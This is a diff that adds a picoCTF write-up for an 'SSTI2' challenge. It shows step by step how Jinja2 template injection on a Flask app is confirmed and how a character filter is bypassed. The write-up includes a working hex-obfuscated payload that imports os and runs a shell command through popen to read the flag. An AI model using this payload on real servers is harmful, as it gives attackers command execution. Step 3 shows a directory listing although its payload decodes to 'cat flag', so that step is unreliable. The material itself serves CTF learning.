@@ -207,3 +207,52 @@ DevTools → Network → Payload to see how the browser encoded our circuit.
 Once correct, the /check response returned:
 { "status": "success", "flag": "picoCTF{...}" }
 Copied the flag from the Network → Response tab instead of the popup.
+
+---
+
+### ID 488 — SSTI2
+
+## Approach:
+
+1. Confirm SSTI
+Sending:
+
+```jinja2
+{{7*7}}
+```
+
+2.Inspect the Environment
+Submitting:
+{{config}}
+prints the Flask config object, confirming that the backend is Flask + Python, and that the input flows directly into a template.
+Direct attribute access like:
+```
+config.__class__.__init__.__globals__
+```
+fails because _, ., and __ are stripped by the filter.
+
+3. Bypassing the Filter:
+I used this payload:
+```
+content={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('\x6f\x73')|attr('\x70\x6f\x70\x65\x6e')('\x63\x61\x74\x20\x66\x6c\x61\x67')|attr('\x72\x65\x61\x64')()}}
+```
+And I got:
+```
+__pycache__
+app.py
+flag
+requirements.txt
+```
+
+5. Reading the flag:
+Payload
+```
+{{request
+|attr('application')
+|attr('\x5f\x5fglobals\x5f\x5f')
+|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')
+|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('\x6f\x73')
+|attr('\x70\x6f\x70\x65\x6e')('\x63\x61\x74\x20\x66\x6c\x61\x67')
+|attr('\x72\x65\x61\x64')()}}
+```
+and prints the picoCTF flag in the <h1> element.
